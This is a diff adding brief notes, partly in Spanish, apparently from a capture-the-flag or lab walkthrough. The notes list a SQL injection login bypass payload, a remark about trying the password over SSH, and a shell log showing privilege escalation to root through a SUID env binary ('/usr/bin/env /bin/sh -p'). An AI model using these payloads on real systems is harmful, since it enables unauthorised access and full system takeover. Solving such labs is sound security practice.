@@ -1,0 +1,13 @@
+admin' or 1=1-- - 
+
+contraseña -> probamos ssh
+
+DESDE LA RAIZ DEL SISTEMA 
+exit
+dylan@e328d4544584:~$ ./usr/bin/env /bin/sh -p
+bash: ./usr/bin/env: No such file or directory
+dylan@e328d4544584:~$ cd /
+dylan@e328d4544584:/$ ./usr/bin/env /bin/sh -p
+# whoami
+root
+# 
